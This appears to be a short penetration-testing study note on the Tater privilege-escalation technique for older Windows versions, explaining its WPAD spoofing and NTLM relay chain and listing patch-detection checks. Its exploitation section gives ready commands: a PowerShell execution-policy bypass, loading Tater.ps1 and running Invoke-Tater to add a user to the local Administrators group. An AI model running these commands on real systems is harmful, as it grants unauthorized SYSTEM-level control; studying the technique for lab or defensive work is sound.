- This trick **was patched starting in Windows 10**, but it still works on **Windows 7**, **Server 2008**, and some **Server 2012** builds.

Tater exploits a Windows **NTLM relay + NBNS spoofing vulnerability** by:
1. **Spoofing WPAD (Web Proxy Auto-Discovery Protocol)** to redirect SYSTEM traffic.
2. Triggering **Windows Defender** (or other SYSTEM-level services) to fetch a proxy auto-config script (`wpad.dat`).
3. SYSTEM process sends **HTTP → SMB request** to `localhost`.
4. Tater **relays that SMB auth token** to itself, impersonates SYSTEM.
5. Executes a command as SYSTEM (in your case: adding user `user` to `Administrators`).


# Possible Detection
---
- `wmic qfe | findstr 3164038`
- `windows_exploit_suggester.py`
# Exploitation
---
- `powershell.exe -nop -ep bypass`
- `. .\Tater.ps1`
- `Invoke-Tater -Trigger 1 -Command "net loc algroup administrators user /add"`
	- ![[Pasted image 20250419041359.png]]